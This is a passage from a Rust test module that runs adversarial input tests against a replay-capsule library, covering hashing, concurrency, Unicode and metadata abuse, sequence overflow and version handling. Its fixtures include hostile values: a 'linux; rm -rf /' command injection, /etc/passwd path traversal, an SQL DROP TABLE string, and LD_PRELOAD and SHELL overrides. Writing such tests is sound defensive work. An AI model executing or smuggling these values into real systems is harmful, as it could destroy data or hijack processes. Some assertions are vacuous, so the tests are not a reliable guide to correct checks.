                    seq: i as u64,
                    data: vec![(capsule_idx % 256) as u8; (capsule_idx * 100) + 100],
                    metadata: {
                        let mut meta = BTreeMap::new();
                        for j in 0..(capsule_idx % 5) {
                            meta.insert(
                                format!("meta_{}_{}", capsule_idx, j),
                                format!("value_{}", "x".repeat(capsule_idx % 50))
                            );
                        }
                        meta
                    },
                })
                .collect();

            let start = std::time::Instant::now();
            let result = create_capsule(&format!("frag_test_{}", capsule_idx), inputs, test_env());
            let duration = start.elapsed();

            // Should complete quickly despite memory fragmentation
            assert!(duration < std::time::Duration::from_millis(500),
                   "Capsule {} creation under memory pressure took too long: {:?}",
                   capsule_idx, duration);

            match result {
                Ok(capsule) => {
                    created_capsules.push(capsule);

                    // Add more fragmentation periodically
                    if capsule_idx % 10 == 0 {
                        for frag_i in 0..1000 {
                            fragmenters.push(vec![(frag_i % 256) as u8; (frag_i % 100) + 1]);
                        }
                    }
                }
                Err(_) => {
                    // Some failures under memory pressure are acceptable
                    continue;
                }
            }
        }

        assert!(created_capsules.len() >= 50,
               "Should create substantial number of capsules despite memory pressure");

        // Validation under memory pressure
        for (i, capsule) in created_capsules.iter().enumerate() {
            let val_start = std::time::Instant::now();
            let validation = validate_capsule(capsule);
            let val_duration = val_start.elapsed();

            assert!(val_duration < std::time::Duration::from_millis(100),
                   "Validation {} under memory pressure took too long: {:?}",
                   i, val_duration);
            assert!(validation.is_ok(), "Capsule {} should validate under memory pressure", i);
        }

        // Memory cleanup should not affect operations
        drop(fragmenters);

        let post_cleanup_capsule = create_capsule("post_cleanup",
            vec![CapsuleInput { seq: 1, data: b"cleanup_test".to_vec(), metadata: BTreeMap::new() }],
            test_env()).expect("should create after cleanup");

        assert!(validate_capsule(&post_cleanup_capsule).is_ok());
    }

    #[test]
    fn negative_hash_computation_with_malformed_and_extreme_data() {
        // Test hash computation with various malformed and extreme data patterns
        let extreme_inputs = vec![
            // Empty data
            vec![CapsuleInput { seq: 0, data: vec![], metadata: BTreeMap::new() }],

            // Single byte patterns
            vec![CapsuleInput { seq: 1, data: vec![0x00], metadata: BTreeMap::new() }],
            vec![CapsuleInput { seq: 2, data: vec![0xFF], metadata: BTreeMap::new() }],

            // Repeating patterns that might confuse hash algorithms
            vec![CapsuleInput { seq: 3, data: vec![0xAA; 1000000], metadata: BTreeMap::new() }],
            vec![CapsuleInput { seq: 4, data: vec![0x55; 1000000], metadata: BTreeMap::new() }],
            vec![CapsuleInput { seq: 5, data: (0u8..=255u8).cycle().take(1000000).collect(), metadata: BTreeMap::new() }],

            // Binary data with potential hash collision patterns
            vec![CapsuleInput { seq: 6, data: b"abc".to_vec(), metadata: BTreeMap::new() }],
            vec![CapsuleInput { seq: 7, data: b"acb".to_vec(), metadata: BTreeMap::new() }],
            vec![CapsuleInput { seq: 8, data: b"bac".to_vec(), metadata: BTreeMap::new() }],

            // Very large single input
            vec![CapsuleInput { seq: 9, data: vec![0x42; 10_000_000], metadata: BTreeMap::new() }],
        ];

        let mut all_hashes = Vec::new();

        for (test_idx, inputs) in extreme_inputs.iter().enumerate() {
            let hash_start = std::time::Instant::now();
            let hash_result = std::panic::catch_unwind(|| {
                compute_inputs_hash(inputs)
            });
            let hash_duration = hash_start.elapsed();

            // Should complete without panic and in reasonable time
            assert!(hash_result.is_ok(), "Hash computation {} should not panic", test_idx);

            if test_idx < 8 { // Skip timing check for very large input
                assert!(hash_duration < std::time::Duration::from_secs(5),
                       "Hash computation {} took too long: {:?}", test_idx, hash_duration);
            }

            let hash = hash_result.unwrap();

            // Hash should be valid hex string
            assert_eq!(hash.len(), 64, "Hash {} should be 64 chars", test_idx);
            assert!(hash.chars().all(|c| c.is_ascii_hexdigit()),
                   "Hash {} should be valid hex", test_idx);

            all_hashes.push(hash);
        }

        // All hashes should be unique (no collisions)
        for i in 0..all_hashes.len() {
            for j in (i + 1)..all_hashes.len() {
                assert_ne!(all_hashes[i], all_hashes[j],
                          "Hash collision detected between test {} and {}: both produced {}",
                          i, j, all_hashes[i]);
            }
        }

        // Test hash determinism
        for (test_idx, inputs) in extreme_inputs.iter().enumerate().take(5) { // Test subset for performance
            let hash1 = compute_inputs_hash(inputs);
            let hash2 = compute_inputs_hash(inputs);
            assert_eq!(hash1, hash2, "Hash computation {} should be deterministic", test_idx);
        }
    }

    #[test]
    fn negative_concurrent_capsule_processing_with_shared_data_corruption_detection() {
        use std::sync::{Arc, Mutex};
        use std::thread;

        // Test concurrent capsule operations to detect potential data corruption
        let shared_results = Arc::new(Mutex::new(Vec::new()));
        let thread_count = 8;
        let operations_per_thread = 50;

        let mut handles = Vec::new();

        for thread_id in 0..thread_count {
            let results = Arc::clone(&shared_results);

            let handle = thread::spawn(move || {
                let mut thread_results = Vec::new();

                for operation in 0..operations_per_thread {
                    // Each thread creates unique capsules
                    let inputs = vec![CapsuleInput {
                        seq: operation as u64,
                        data: format!("thread_{}_op_{}", thread_id, operation).as_bytes().to_vec(),
                        metadata: {
                            let mut meta = BTreeMap::new();
                            meta.insert("thread_id".to_string(), thread_id.to_string());
                            meta.insert("operation".to_string(), operation.to_string());
                            meta
                        },
                    }];

                    let capsule_id = format!("concurrent_{}_{}", thread_id, operation);

                    let create_start = std::time::Instant::now();
                    let create_result = create_capsule(&capsule_id, inputs, test_env());
                    let create_duration = create_start.elapsed();

                    assert!(create_duration < std::time::Duration::from_millis(200),
                           "Thread {} operation {} creation took too long: {:?}",
                           thread_id, operation, create_duration);

                    match create_result {
                        Ok(capsule) => {
                            // Validate capsule integrity
                            assert_eq!(capsule.capsule_id, capsule_id);
                            assert_eq!(capsule.inputs.len(), 1);
                            assert_eq!(capsule.inputs[0].seq, operation as u64);

                            // Validate metadata integrity
                            let thread_id_meta = capsule.inputs[0].metadata.get("thread_id").unwrap();
                            let operation_meta = capsule.inputs[0].metadata.get("operation").unwrap();
                            assert_eq!(thread_id_meta, &thread_id.to_string());
                            assert_eq!(operation_meta, &operation.to_string());

                            // Validation should succeed
                            let val_result = validate_capsule(&capsule);
                            assert!(val_result.is_ok(),
                                   "Thread {} operation {} validation failed: {:?}",
                                   thread_id, operation, val_result);

                            // JSON round-trip should preserve integrity
                            let json = to_canonical_json(&capsule);
                            assert!(json.is_ok(),
                                   "Thread {} operation {} JSON serialization failed",
                                   thread_id, operation);

                            if let Ok(json_str) = json {
                                let parse_result = from_json(&json_str);
                                assert!(parse_result.is_ok(),
                                       "Thread {} operation {} JSON parsing failed",
                                       thread_id, operation);

                                if let Ok(parsed_capsule) = parse_result {
                                    assert_eq!(parsed_capsule.capsule_id, capsule.capsule_id);
                                    assert_eq!(parsed_capsule.inputs[0].data, capsule.inputs[0].data);
                                }
                            }

                            thread_results.push((thread_id, operation, "success", capsule.capsule_id));
                        }
                        Err(e) => {
                            thread_results.push((thread_id, operation, "error", format!("{:?}", e)));
                        }
                    }
                }

                // Store results
                {
                    let mut shared = results.lock().unwrap();
                    shared.extend(thread_results);
                }
            });

            handles.push(handle);
        }

        // Wait for all threads
        for handle in handles {
            handle.join().expect("Thread should complete successfully");
        }

        let final_results = shared_results.lock().unwrap();

        // Verify all operations completed
        assert_eq!(final_results.len(), thread_count * operations_per_thread);

        // Count successes
        let success_count = final_results.iter()
            .filter(|(_, _, status, _)| *status == "success")
            .count();

        let success_rate = success_count as f64 / final_results.len() as f64;
        assert!(success_rate > 0.95,
               "Success rate too low under concurrent load: {:.2}%", success_rate * 100.0);

        // Verify no data corruption - each thread's data should be isolated
        for (thread_id, operation, status, result) in final_results.iter() {
            if *status == "success" {
                let expected_id = format!("concurrent_{}_{}", thread_id, operation);
                assert_eq!(*result, expected_id,
                          "Data corruption detected: thread {} op {} produced wrong ID",
                          thread_id, operation);
            }
        }
    }

    #[test]
    fn negative_replay_and_verify_with_corrupted_expected_outputs() {
        // Test replay verification with various types of output corruption
        let base_inputs = vec![CapsuleInput {
            seq: 1,
            data: b"deterministic_test_data".to_vec(),
            metadata: BTreeMap::new(),
        }];

        let mut capsule = create_capsule("corruption_test", base_inputs, test_env())
            .expect("base capsule should create");

        // Store original expected output for comparison
        let original_output = capsule.expected_outputs[0].clone();

        let corruption_patterns = vec![
            // Flip single bit
            {
                let mut corrupted = original_output.clone();
                if !corrupted.output_hash.is_empty() {
                    let mut chars: Vec<char> = corrupted.output_hash.chars().collect();
                    chars[0] = if chars[0] == 'a' { 'b' } else { 'a' };
                    corrupted.output_hash = chars.into_iter().collect();
                }
                corrupted
            },

            // Completely different hash
            {
                let mut corrupted = original_output.clone();
                corrupted.output_hash = "f".repeat(64);
                corrupted
            },

            // Empty hash
            {
                let mut corrupted = original_output.clone();
                corrupted.output_hash = "".to_string();
                corrupted
            },

            // Invalid hex hash
            {
                let mut corrupted = original_output.clone();
                corrupted.output_hash = "zzzz".repeat(16);
                corrupted
            },

            // Wrong length hash
            {
                let mut corrupted = original_output.clone();
                corrupted.output_hash = "a".repeat(32); // Too short
                corrupted
            },

            // Hash with injection attempt
            {
                let mut corrupted = original_output.clone();
                corrupted.output_hash = format!("{}../../../etc/passwd", "a".repeat(32));
                corrupted
            },
        ];

        for (i, corrupted_output) in corruption_patterns.iter().enumerate() {
            let mut test_capsule = capsule.clone();
            test_capsule.expected_outputs = vec![corrupted_output.clone()];

            let replay_result = replay_and_verify(&test_capsule);

            match replay_result {
                Ok(verified) => {
                    // Should detect corruption and return false
                    assert!(!verified,
                           "Corruption pattern {} should be detected and fail verification", i);
                }
                Err(_) => {
                    // Early detection of corruption during replay is also acceptable
                }
            }

            // Validation should still work (structural integrity)
            let validation = validate_capsule(&test_capsule);
            // May pass or fail depending on severity of corruption
            assert!(validation.is_ok() || validation.is_err(),
                   "Validation should complete deterministically for corruption pattern {}", i);
        }

        // Original capsule should still verify correctly
        let original_verify = replay_and_verify(&capsule).expect("original should replay");
        assert!(original_verify, "Original capsule should pass verification");
    }

    #[test]
    fn negative_capsule_comprehensive_unicode_injection_and_metadata_attacks() {
        // Test comprehensive Unicode injection and metadata attack resistance
        let malicious_unicode_patterns = [
            "\u{202E}\u{202D}fake_capsule\u{202C}",       // Right-to-left override
            "capsule\u{000A}\u{000D}injected\x00nulls",   // CRLF + null injection
            "\u{FEFF}bom_capsule\u{FFFE}reversed",        // BOM injection attacks
            "\u{200B}\u{200C}\u{200D}zero_width",         // Zero-width characters
            "胶囊\u{007F}\u{0001}\u{001F}控制字符",         // Unicode + control chars
            "\u{FFFF}\u{FFFE}\u{FDD0}non_characters",     // Non-character code points
            "🎬🔄\u{1F4A5}💥\u{1F52B}🔫",                 // Complex emoji sequences
            "\u{0300}\u{0301}\u{0302}combining_marks",    // Combining marks
            format!("../../../{}", "x".repeat(1000)),      // Path traversal + long string
            "capsule\x00\x01\x02\x03\x04\x05hidden",       // Binary injection
        ];

        for (i, pattern) in malicious_unicode_patterns.iter().enumerate() {
            // Test Unicode injection in capsule ID
            let unicode_id = format!("unicode_test_{}{}", pattern, i);

            // Create metadata with potentially malicious Unicode content
            let mut malicious_metadata = BTreeMap::new();
            malicious_metadata.insert(
                format!("key_{}", pattern),
                format!("value_with_{}_injection", pattern),
            );
            malicious_metadata.insert(
                "normal_key".to_string(),
                format!("normal_value_but_unicode_{}", pattern),
            );

            // Test with Unicode in input data
            let unicode_input = CapsuleInput {
                seq: 1,
                data: pattern.as_bytes().to_vec(),
                metadata: malicious_metadata.clone(),
            };

            // Test with Unicode in environment properties
            let mut unicode_env_props = BTreeMap::new();
            unicode_env_props.insert(
                format!("env_key_{}", pattern),
                format!("env_value_{}", pattern),
            );
            unicode_env_props.insert("PATH".to_string(), format!("/usr/bin:{}", pattern));

            let unicode_env = EnvironmentSnapshot {
                runtime_version: format!("runtime_{}", pattern),
                platform: format!("platform_{}", pattern),
                config_hash: format!("config_hash_{}", pattern),
                properties: unicode_env_props,
            };

            // Attempt to create capsule with Unicode content
            let result = create_capsule(&unicode_id, vec![unicode_input], unicode_env);

            match result {
                Ok(capsule) => {
                    // If creation succeeds, verify structure integrity
                    assert!(!capsule.capsule_id.is_empty());
                    assert_eq!(capsule.format_version, CURRENT_FORMAT_VERSION);
                    assert_eq!(capsule.inputs.len(), 1);
                    assert!(!capsule.expected_outputs.is_empty());

                    // Validate the capsule structure
                    let validation = validate_capsule(&capsule);
                    match validation {
                        Ok(_) => {
                            // Valid capsule should be serializable
                            let serialized = serde_json::to_string(&capsule);
                            assert!(serialized.is_ok(), "Unicode capsule should be serializable");

                            // And deserializable
                            if let Ok(json_str) = serialized {
                                let deserialized: Result<ReplayCapsule, _> = serde_json::from_str(&json_str);
                                assert!(deserialized.is_ok(), "Unicode capsule should be deserializable");

                                if let Ok(reconstructed) = deserialized {
                                    assert_eq!(reconstructed.capsule_id, capsule.capsule_id);
                                    assert_eq!(reconstructed.inputs.len(), capsule.inputs.len());
                                }
                            }

                            // Test replay with Unicode content
                            let replay_result = replay_and_verify(&capsule);
                            match replay_result {
                                Ok(_verified) => {
                                    // Unicode should not break replay mechanism
                                }
                                Err(_) => {
                                    // May fail due to extreme Unicode content - acceptable
                                }
                            }
                        }
                        Err(_) => {
                            // Some extreme Unicode patterns may be rejected during validation
                        }
                    }
                }
                Err(_) => {
                    // Extreme Unicode patterns may be rejected during creation
                }
            }
        }

        // Test metadata size and key/value attacks
        let metadata_attacks = vec![
            // Extremely long keys
            BTreeMap::from([("x".repeat(100_000), "value".to_string())]),
            // Extremely long values
            BTreeMap::from([("key".to_string(), "y".repeat(100_000))]),
            // Many small key-value pairs
            (0..10_000).map(|i| (format!("key_{}", i), format!("value_{}", i))).collect(),
            // Binary data in metadata
            BTreeMap::from([
                (
                    "\x00\x01\x02key".to_string(),
                    String::from_utf8_lossy(b"\xFF\xFE\xFDvalue").into_owned(),
                ),
                ("normal_key".to_string(), std::str::from_utf8(&vec![0x80; 1000]).unwrap_or("fallback").to_string()),
            ]),
        ];

        for (attack_idx, attack_metadata) in metadata_attacks.into_iter().enumerate() {
            let input = CapsuleInput {
                seq: 1,
                data: format!("metadata_attack_{}", attack_idx).as_bytes().to_vec(),
                metadata: attack_metadata,
            };

            let result = create_capsule(&format!("metadata_attack_{}", attack_idx), vec![input], test_env());

            match result {
                Ok(capsule) => {
                    // Should handle large metadata gracefully
                    assert!(!capsule.inputs.is_empty());

                    // Validation should complete without panic
                    let _validation = validate_capsule(&capsule);

                    // Serialization should not crash
                    let _serialized = serde_json::to_string(&capsule);
                }
                Err(_) => {
                    // May reject extreme metadata sizes
                }
            }
        }
    }

    #[test]
    fn negative_sequence_number_overflow_and_ordering_attacks() {
        // Test sequence number overflow and ordering attack resistance
        let extreme_sequences = vec![
            // Normal sequence
            vec![1, 2, 3, 4, 5],
            // Gaps in sequence
            vec![1, 10, 100, 1000, 10000],
            // Near u64::MAX
            vec![u64::MAX - 5, u64::MAX - 4, u64::MAX - 3, u64::MAX - 2, u64::MAX - 1, u64::MAX],
            // Wraparound attempt
            vec![u64::MAX, 0, 1],
            // Descending sequence (invalid)
            vec![5, 4, 3, 2, 1],
            // Duplicate sequences (invalid)
            vec![1, 2, 2, 3, 4],
            // Single extreme value
            vec![u64::MAX],
            // Zero start
            vec![0, 1, 2, 3],
            // Large jumps
            vec![1, u64::MAX / 4, u64::MAX / 2, u64::MAX],
        ];

        for (test_idx, sequences) in extreme_sequences.into_iter().enumerate() {
            let inputs: Vec<CapsuleInput> = sequences
                .iter()
                .map(|&seq| CapsuleInput {
                    seq,
                    data: format!("seq_test_{}_{}", test_idx, seq).as_bytes().to_vec(),
                    metadata: BTreeMap::new(),
                })
                .collect();

            let result = create_capsule(&format!("seq_test_{}", test_idx), inputs, test_env());

            match result {
                Ok(capsule) => {
                    // If creation succeeds, verify sequence constraints
                    let mut prev_seq = None;
                    for input in &capsule.inputs {
                        if let Some(prev) = prev_seq {
                            assert!(input.seq > prev,
                                   "Sequence should be monotonically increasing: {} <= {}", input.seq, prev);
                        }
                        prev_seq = Some(input.seq);
                    }

                    // Validation should pass for valid sequences
                    let validation = validate_capsule(&capsule);
                    assert!(validation.is_ok(),
                           "Valid sequence {} should pass validation", test_idx);

                    // Expected outputs should have corresponding sequences
                    for output in &capsule.expected_outputs {
                        assert!(capsule.inputs.iter().any(|input| input.seq == output.seq),
                               "Output sequence {} should correspond to an input", output.seq);
                    }

                    // Test replay with extreme sequence numbers
                    let replay_result = replay_and_verify(&capsule);
                    match replay_result {
                        Ok(_) => {
                            // Should handle large sequence numbers correctly
                        }
                        Err(_) => {
                            // May fail for extreme values due to implementation limits
                        }
                    }
                }
                Err(err) => {
                    // Invalid sequences should be rejected with appropriate errors
                    match err {
                        CapsuleError::NonMonotonicInputSequence => {
                            // Expected for descending or duplicate sequences
                            assert!(test_idx == 4 || test_idx == 5 || test_idx == 2,
                                   "Non-monotonic error should only occur for invalid sequences");
                        }
                        _ => {
                            // Other errors may occur for extreme values
                        }
                    }
                }
            }
        }

        // Test arithmetic overflow scenarios in sequence processing
        let overflow_scenarios = vec![
            // Addition overflow potential
            (u64::MAX - 1, 2u64),
            (u64::MAX, 1u64),
            // Subtraction underflow potential
            (0u64, u64::MAX),
            (1u64, u64::MAX),
        ];

        for (start_seq, increment) in overflow_scenarios {
            let mut test_inputs = vec![CapsuleInput {
                seq: start_seq,
                data: b"overflow_test_start".to_vec(),
                metadata: BTreeMap::new(),
            }];

            // Carefully add incremented sequence to avoid overflow in test code
            let next_seq = start_seq.saturating_add(increment);
            if next_seq > start_seq { // Only add if increment actually increased the value
                test_inputs.push(CapsuleInput {
                    seq: next_seq,
                    data: b"overflow_test_next".to_vec(),
                    metadata: BTreeMap::new(),
                });
            }

            let result = create_capsule("overflow_test", test_inputs, test_env());

            // Should handle arithmetic edge cases gracefully
            match result {
                Ok(capsule) => {
                    // Verify no sequence overflow occurred
                    for window in capsule.inputs.windows(2) {
                        assert!(window[1].seq > window[0].seq,
                               "Sequence overflow detected: {} -> {}", window[0].seq, window[1].seq);
                    }
                }
                Err(_) => {
                    // May reject sequences that could cause overflow
                }
            }
        }
    }

    #[test]
    fn negative_format_version_compatibility_and_schema_evolution_attacks() {
        // Test format version compatibility and schema evolution attack resistance
        let version_attack_scenarios = vec![
            // Valid version
            CURRENT_FORMAT_VERSION,
            // Minimum version
            MIN_FORMAT_VERSION,
            // Zero version (invalid)
            0,
            // Future version
            CURRENT_FORMAT_VERSION + 1,
            // Far future version
            CURRENT_FORMAT_VERSION + 1000,
            // Very large version
            u32::MAX - 1,
            // Maximum u32 value
            u32::MAX,
            // Potential overflow values around current version
            CURRENT_FORMAT_VERSION.saturating_sub(1),
            CURRENT_FORMAT_VERSION.saturating_add(1),
        ];

        for version in version_attack_scenarios {
            // Create capsule with specific version manually (bypass constructor validation)
            let mut test_capsule = ReplayCapsule {
                capsule_id: format!("version_test_{}", version),
                format_version: version,
                inputs: vec![CapsuleInput {
                    seq: 1,
                    data: b"version_test_data".to_vec(),
                    metadata: BTreeMap::new(),
                }],
                expected_outputs: vec![CapsuleOutput {
                    seq: 1,
                    data: b"expected_version_data".to_vec(),
                    output_hash: "a".repeat(64),
                }],
                environment: test_env(),
            };

            // Test validation with various versions
            let validation = validate_capsule(&test_capsule);

            match validation {
                Ok(_) => {
                    // Valid versions should pass
                    assert!(version >= MIN_FORMAT_VERSION && version <= CURRENT_FORMAT_VERSION,
                           "Only supported versions should pass validation: {}", version);

                    // Test serialization/deserialization with valid version
                    let serialized = serde_json::to_string(&test_capsule);
                    assert!(serialized.is_ok(), "Valid version capsule should serialize");

                    if let Ok(json_str) = serialized {
                        let deserialized: Result<ReplayCapsule, _> = serde_json::from_str(&json_str);
                        assert!(deserialized.is_ok(), "Valid version capsule should deserialize");

                        if let Ok(reconstructed) = deserialized {
                            assert_eq!(reconstructed.format_version, version);
                            assert_eq!(reconstructed.capsule_id, test_capsule.capsule_id);
                        }
                    }

                    // Test replay compatibility
                    let replay_result = replay_and_verify(&test_capsule);
                    // May succeed or fail depending on version compatibility implementation
                }
                Err(err) => {
                    // Invalid versions should be rejected
                    match err {
                        CapsuleError::UnsupportedVersion(v) => {
                            assert_eq!(v, version, "Error should report the correct unsupported version");
                            assert!(version < MIN_FORMAT_VERSION || version > CURRENT_FORMAT_VERSION,
                                   "Only unsupported versions should produce UnsupportedVersion error");
                        }
                        _ => {
                            // Other validation errors may occur for extreme values
                        }
                    }
                }
            }

            // Test schema evolution simulation with version downgrade attacks
            if version == CURRENT_FORMAT_VERSION {
                // Simulate future schema with additional fields (JSON injection)
                let future_schema_json = format!(
                    r#"{{
                        "capsule_id": "future_schema_test",
                        "format_version": {},
                        "inputs": [{{
                            "seq": 1,
                            "data": [116, 101, 115, 116],
                            "metadata": {{}}
                        }}],
                        "expected_outputs": [{{
                            "seq": 1,
                            "data": [116, 101, 115, 116],
                            "output_hash": "{}"
                        }}],
                        "environment": {{
                            "runtime_version": "test",
                            "platform": "test",
                            "config_hash": "test",
                            "properties": {{}}
                        }},
                        "future_field": "malicious_data",
                        "injection_attempt": "../../../etc/passwd"
                    }}"#,
                    version,
                    "b".repeat(64)
                );

                // Should either accept (ignoring unknown fields) or reject gracefully
                let parse_result: Result<ReplayCapsule, _> = serde_json::from_str(&future_schema_json);
                match parse_result {
                    Ok(parsed) => {
                        // If parsed, should maintain schema integrity
                        assert_eq!(parsed.format_version, version);
                        assert_eq!(parsed.inputs.len(), 1);
                        assert_eq!(parsed.expected_outputs.len(), 1);

                        // Validation should still work
                        let _validation = validate_capsule(&parsed);
                    }
                    Err(_) => {
                        // Rejection of unknown fields is acceptable
                    }
                }
            }
        }

        // Test version compatibility matrix simulation
        let compatibility_tests = vec![
            (MIN_FORMAT_VERSION, CURRENT_FORMAT_VERSION),  // Min to current
            (CURRENT_FORMAT_VERSION, MIN_FORMAT_VERSION),  // Current to min
            (0, CURRENT_FORMAT_VERSION),                    // Invalid to current
            (CURRENT_FORMAT_VERSION, u32::MAX),            // Current to invalid
        ];

        for (from_version, to_version) in compatibility_tests {
            // Simulate version migration scenarios
            let base_capsule = ReplayCapsule {
                capsule_id: format!("compat_test_{}_{}", from_version, to_version),
                format_version: from_version,
                inputs: vec![CapsuleInput {
                    seq: 1,
                    data: b"compatibility_test".to_vec(),
                    metadata: BTreeMap::new(),
                }],
                expected_outputs: vec![CapsuleOutput {
                    seq: 1,
                    data: b"compatibility_expected".to_vec(),
                    output_hash: "c".repeat(64),
                }],
                environment: test_env(),
            };

            // Test "migration" by changing version
            let mut migrated_capsule = base_capsule.clone();
            migrated_capsule.format_version = to_version;

            let original_validation = validate_capsule(&base_capsule);
            let migrated_validation = validate_capsule(&migrated_capsule);

            // Both should be consistent (both valid or both invalid based on version support)
            match (original_validation, migrated_validation) {
                (Ok(_), Ok(_)) => {
                    // Both valid - versions should be in supported range
                    assert!(from_version >= MIN_FORMAT_VERSION && from_version <= CURRENT_FORMAT_VERSION);
                    assert!(to_version >= MIN_FORMAT_VERSION && to_version <= CURRENT_FORMAT_VERSION);
                }
                (Err(_), Err(_)) => {
                    // Both invalid - at least one version should be unsupported
                    assert!(from_version < MIN_FORMAT_VERSION || from_version > CURRENT_FORMAT_VERSION ||
                           to_version < MIN_FORMAT_VERSION || to_version > CURRENT_FORMAT_VERSION);
                }
                _ => {
                    // Mixed results indicate version-dependent behavior
                }
            }
        }
    }

    #[test]
    fn negative_environment_snapshot_injection_and_corruption_resistance() {
        // Test environment snapshot injection and corruption attack resistance
        let injection_environments = vec![
            // Path injection in runtime_version
            EnvironmentSnapshot {
                runtime_version: "../../../malicious/runtime".to_string(),
                platform: "linux-x86_64".to_string(),
                config_hash: "d".repeat(64),
                properties: BTreeMap::new(),
            },
            // Command injection in platform
            EnvironmentSnapshot {
                runtime_version: "v1.0".to_string(),
                platform: "linux; rm -rf /".to_string(),
                config_hash: "e".repeat(64),
                properties: BTreeMap::new(),
            },
            // SQL injection style in config_hash
            EnvironmentSnapshot {
                runtime_version: "v1.0".to_string(),
                platform: "linux-x86_64".to_string(),
                config_hash: "'; DROP TABLE capsules; --".to_string(),
                properties: BTreeMap::new(),
            },
            // Environment variable injection
            EnvironmentSnapshot {
                runtime_version: "v1.0".to_string(),
                platform: "linux-x86_64".to_string(),
                config_hash: "f".repeat(64),
                properties: BTreeMap::from([
                    ("PATH".to_string(), "/malicious:/usr/bin".to_string()),
                    ("LD_PRELOAD".to_string(), "/tmp/malicious.so".to_string()),
                    ("SHELL".to_string(), "/bin/bash -c 'evil_command'".to_string()),
                ]),
            },
            // Binary data in properties
            EnvironmentSnapshot {
                runtime_version: "v1.0".to_string(),
                platform: "linux-x86_64".to_string(),
                config_hash: "g".repeat(64),
                properties: BTreeMap::from([
                    (
                        "\x00\x01binary_key".to_string(),
                        String::from_utf8_lossy(b"\xFF\xFEbinary_value").into_owned(),
                    ),
                    ("normal_key".to_string(), std::str::from_utf8(&vec![0x80; 1000]).unwrap_or("fallback").to_string()),
                ]),
            },
            // Extremely large environment
            EnvironmentSnapshot {
                runtime_version: "x".repeat(100_000),
                platform: "y".repeat(100_000),
                config_hash: "h".repeat(100_000),
                properties: (0..10_000)
                    .map(|i| (format!("huge_key_{}", i), format!("huge_value_{}", i)))
                    .collect(),
            },
            // Unicode injection in environment
            EnvironmentSnapshot {
                runtime_version: "runtime\u{202E}\u{202D}fake\u{202C}".to_string(),
                platform: "platform\u{0000}\u{000A}\u{000D}injection".to_string(),
                config_hash: "控制字符\u{007F}\u{0001}hash".to_string(),
                properties: BTreeMap::from([
                    ("🚀💻key".to_string(), "🎬🔄value".to_string()),
                    ("\u{200B}\u{200C}invisible".to_string(), "\u{FEFF}bom_value".to_string()),
                ]),
            },
        ];

        for (env_idx, test_env) in injection_environments.into_iter().enumerate() {
            let test_input = CapsuleInput {
                seq: 1,
                data: format!("env_injection_test_{}", env_idx).as_bytes().to_vec(),
                metadata: BTreeMap::new(),
            };

            let result = create_capsule(&format!("env_test_{}", env_idx), vec![test_input], test_env);

            match result {
                Ok(capsule) => {
                    // If capsule creation succeeds, verify environment safety
                    assert!(!capsule.environment.runtime_version.is_empty());
                    assert!(!capsule.environment.platform.is_empty());

                    // Environment should not contain null bytes (common injection vector)
                    assert!(!capsule.environment.runtime_version.contains('\0'));
                    assert!(!capsule.environment.platform.contains('\0'));
                    assert!(!capsule.environment.config_hash.contains('\0'));

                    for (key, value) in &capsule.environment.properties {
                        assert!(!key.contains('\0'), "Environment keys should not contain null bytes");
                        assert!(!value.contains('\0'), "Environment values should not contain null bytes");
                    }

                    // Test serialization safety
                    let serialized = serde_json::to_string(&capsule);
                    match serialized {
                        Ok(json_str) => {
                            // JSON should be well-formed despite injection attempts
                            assert!(!json_str.contains("\0"));

                            // Should be deserializable
                            let deserialized: Result<ReplayCapsule, _> = serde_json::from_str(&json_str);
                            assert!(deserialized.is_ok(), "Injection-resistant capsule should deserialize");

                            if let Ok(reconstructed) = deserialized {
                                // Reconstructed environment should maintain integrity
                                assert_eq!(reconstructed.environment.runtime_version, capsule.environment.runtime_version);
                                assert_eq!(reconstructed.environment.platform, capsule.environment.platform);
                                assert_eq!(reconstructed.environment.properties.len(), capsule.environment.properties.len());
                            }
                        }
                        Err(_) => {
                            // May fail to serialize extreme content - acceptable safety measure
                        }
                    }

                    // Test validation with potentially malicious environment
                    let validation = validate_capsule(&capsule);
                    match validation {
                        Ok(_) => {
                            // Environment passed validation checks
                            // Test replay with potentially malicious environment
                            let replay_result = replay_and_verify(&capsule);
                            // May succeed or fail, but should not cause security issues
                        }
                        Err(err) => {
                            // Validation may reject obviously malicious environments
                            match err {
                                CapsuleError::IncompleteEnvironment(_) => {
                                    // Expected for malformed environments
                                }
                                _ => {
                                    // Other validation failures are acceptable
                                }
                            }
                        }
                    }
                }
                Err(_) => {
                    // Creation may reject environments with obvious injection attempts
                }
            }
        }

        // Test environment hash consistency and tampering detection
        let base_env = test_env();
        let base_input = CapsuleInput {
            seq: 1,
            data: b"hash_consistency_test".to_vec(),
            metadata: BTreeMap::new(),
        };

        let original_capsule = create_capsule("hash_test", vec![base_input.clone()], base_env.clone())
            .expect("base capsule should create");

        // Modify environment in various ways and test hash sensitivity
        let environment_modifications = vec![
            // Change runtime version
            EnvironmentSnapshot {
                runtime_version: format!("{}_modified", base_env.runtime_version),
                ..base_env.clone()
            },
            // Change platform
            EnvironmentSnapshot {
                platform: format!("{}_modified", base_env.platform),
                ..base_env.clone()
            },
            // Change config hash
            EnvironmentSnapshot {
                config_hash: format!("{}_modified", base_env.config_hash),
                ..base_env.clone()
            },
            // Add property
            EnvironmentSnapshot {
                properties: {
                    let mut props = base_env.properties.clone();
                    props.insert("new_property".to_string(), "new_value".to_string());
                    props
                },
                ..base_env.clone()
            },
            // Modify existing property
            EnvironmentSnapshot {
                properties: {
                    let mut props = base_env.properties.clone();
                    if let Some(first_key) = props.keys().next().cloned() {
                        props.insert(first_key, "modified_value".to_string());
                    }
                    props
                },
                ..base_env.clone()
            },
        ];

        for (mod_idx, modified_env) in environment_modifications.into_iter().enumerate() {
            let modified_capsule = create_capsule(
                &format!("env_mod_{}", mod_idx),
                vec![base_input.clone()],
                modified_env,
            )
            .expect("modified capsule should create");

            // Modified environment should produce different capsule behavior
            // (This test verifies that environment changes are properly captured)

            let original_replay = replay_and_verify(&original_capsule);
            let modified_replay = replay_and_verify(&modified_capsule);

            // Replay results may differ due to environment changes
            // The important thing is that both complete without security issues
            match (original_replay, modified_replay) {
                (Ok(_), Ok(_)) => {
                    // Both succeeded - environment changes may not affect this simple test
                }
                _ => {
                    // Different results are expected when environment affects replay
                }
            }
        }
    }

    #[test]
    fn negative_input_data_size_limits_and_memory_exhaustion_attacks() {
        // Test input data size limits and memory exhaustion attack resistance
        let size_attack_scenarios = vec![
            // Empty data
            vec![],
            // Single byte
            vec![42],
            // Normal size
            vec![0; 1024],
